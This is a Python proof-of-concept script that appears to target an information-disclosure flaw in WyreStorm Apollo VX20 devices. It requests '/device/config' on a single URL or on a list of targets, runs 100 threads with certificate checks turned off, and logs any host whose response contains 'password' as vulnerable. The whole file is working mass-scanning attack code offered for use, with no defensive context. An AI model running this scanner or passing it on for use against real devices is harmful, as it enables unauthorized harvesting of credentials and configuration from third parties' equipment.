import argparse
from multiprocessing.dummy import Pool
import requests

requests.packages.urllib3.disable_warnings()
import sys


def main():
    banner()
    paserse = argparse.ArgumentParser(description="WyreStorm Apollo VX20 信息泄露漏洞")
    paserse.add_argument('-u', '--url', help="please input your url")
    paserse.add_argument('-f', '--file', help="please input your file")
    args = paserse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file, 'r', encoding='utf-8') as fp:
            fo = fp.readlines()
            url_list = []
            for i in fo:
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def banner():
    banner = """


$$\      $$\                                $$$$$$\    $$\                                       
$$ | $\  $$ |                              $$  __$$\   $$ |                                      
$$ |$$$\ $$ |$$\   $$\  $$$$$$\   $$$$$$\  $$ /  \__|$$$$$$\    $$$$$$\   $$$$$$\  $$$$$$\$$$$\  
$$ $$ $$\$$ |$$ |  $$ |$$  __$$\ $$  __$$\ \$$$$$$\  \_$$  _|  $$  __$$\ $$  __$$\ $$  _$$  _$$\ 
$$$$  _$$$$ |$$ |  $$ |$$ |  \__|$$$$$$$$ | \____$$\   $$ |    $$ /  $$ |$$ |  \__|$$ / $$ / $$ |
$$$  / \$$$ |$$ |  $$ |$$ |      $$   ____|$$\   $$ |  $$ |$$\ $$ |  $$ |$$ |      $$ | $$ | $$ |
$$  /   \$$ |\$$$$$$$ |$$ |      \$$$$$$$\ \$$$$$$  |  \$$$$  |\$$$$$$  |$$ |      $$ | $$ | $$ |
\__/     \__| \____$$ |\__|       \_______| \______/    \____/  \______/ \__|      \__| \__| \__|
             $$\   $$ |                                                                          
             \$$$$$$  |                                                                          
              \______/                                                                           



    """
    print(banner)


def poc(target):
    url = target + '/device/config'
    try:
        result = requests.get(url=url, timeout=5, verify=False).text
        if 'password' in result:
            with open('resultWyre.txt', 'a') as fp1:
                fp1.write(f'[+]{target} is veriable' + '\n')
        else:
            print(f'[-]{target} is not veriable')
    except:
        print(f'[*]{target} server error')


if __name__ == '__main__':
    main()